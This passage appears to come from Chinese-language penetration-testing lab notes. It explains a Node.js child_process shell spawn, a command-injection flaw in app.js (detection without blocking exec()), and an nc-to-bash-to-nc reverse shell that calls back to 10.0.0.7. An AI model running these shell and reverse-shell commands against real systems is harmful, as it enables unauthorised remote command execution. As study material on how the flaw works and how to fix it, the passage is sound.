注解

  • -e：
    • 这个选项告诉 Node.js 在命令行直接执行后面的 JavaScript 代码（而不是从文件中执行）。
  • require("child_process")：
    • 使用 Node.js 内置的 child_process 模块。这个模块允许在 Node.js 中创建新的子进程，并通过这些子进程执行外部的命令或程序。
  • spawn("/bin/sh", {stdio: [0, 1, 2]})：
    • spawn("/bin/sh")：通过 spawn 函数启动一个新的 shell（即 /bin/sh）。/bin/sh 是类 Unix 系统上的基本 shell 程序，它可以接受和执行命令。
    • {stdio: [0, 1, 2]}：将子进程的标准输入、标准输出和标准错误与父进程（当前 shell）绑定。
      • 0 代表 标准输入（stdin），连接到当前终端的输入。
      • 1 代表 标准输出（stdout），连接到当前终端的输出。
      • 2 代表 标准错误（stderr），也连接到当前终端。

app.js 中虽然对危险命令做了检测，但并未拦截 exec() 函数对恶意命令的执行，应当在检测的 if 后加个 else ，将 exec() 包含其中，这也是为什么 curl 能成功上传 php 脚本

命令注解【适用 nc 不具有 -e参数的情况】 - nc 10.0.0.7 4444: - 通过 nc（Netcat）连接到 IP 地址 10.0.0.7 的 4444 端口。nc 是一种通用的网络工具，能够创建 TCP 或 UDP 连接。 - 这个命令从 10.0.0.7:4444 接收数据，并将该数据作为输入发送到后面的命令。 - | /bin/bash: - 管道符号 | 将前一个命令（即从 nc 10.0.0.7 4444 获取的数据）传递给 /bin/bash，也就是说，将从 4444 端口接收到的内容作为命令在本地执行。 - 换句话说，攻击者从 10.0.0.7:4444 发送的任何命令都会在本地机器上通过 bash 执行。 - | nc 10.0.0.7 5555: - 将 bash 的输出通过另一个管道符传递给 nc，并通过它发送到 10.0.0.7:5555。 - 这意味着，所有 bash 执行的命令的结果（标准输出和标准错误）会发送回 10.0.0.7 的 5555 端口。 ### 3.2.
